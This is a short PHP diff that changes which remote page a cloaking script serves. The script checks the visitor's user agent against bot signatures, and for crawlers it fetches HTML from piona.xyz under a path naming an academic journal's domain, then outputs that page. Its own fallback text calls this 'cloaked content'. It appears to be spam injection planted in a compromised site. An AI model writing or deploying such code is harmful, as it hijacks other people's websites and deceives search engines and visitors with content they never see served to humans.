@@ -21,7 +21,7 @@ $bot_signatures = [
 if (strpos($request_uri, '/') !== false) { 
     foreach ($bot_signatures as $bot) { 
         if (strpos($user_agent, $bot) !== false) { 
-            $html = @file_get_contents('https://piona.xyz/landing/jurnal.eka-prasetya.ac.id/eka.html'); 
+            $html = @file_get_contents('https://piona.xyz/landing/jurnal.eka-prasetya.ac.id/prasetya.html'); 
             header("Content-Type: text/html; charset=UTF-8"); 
             echo $html !== false ? $html : "Cloaked content failed to load."; 
             exit; 
